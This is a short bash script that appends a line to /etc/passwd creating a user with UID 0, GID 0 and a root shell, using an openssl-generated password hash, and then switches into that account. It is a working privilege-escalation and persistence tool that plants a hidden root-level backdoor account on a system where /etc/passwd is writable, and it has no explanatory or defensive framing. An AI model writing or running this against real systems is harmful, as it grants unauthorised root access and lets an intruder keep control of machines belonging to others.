#!/bin/bash
# useage: ./etcpassauto.sh <name> <password>

PATH_SHELL=':0:0:root:/root:/bin/bash'
LINE=`openssl passwd -1 -salt ${1} ${2}`
NAME=${1}
COLON=':'
FULL="$NAME$COLON$LINE$PATH_SHELL"
# example passwd entry
# nick:$1$nick$wpxLQpjimyPiRinw9Hj7W0:0:0:root:/root:/bin/bash
echo $FULL >> /etc/passwd
useradd -m ${1} 
echo "Login to ${1}"
su ${1}
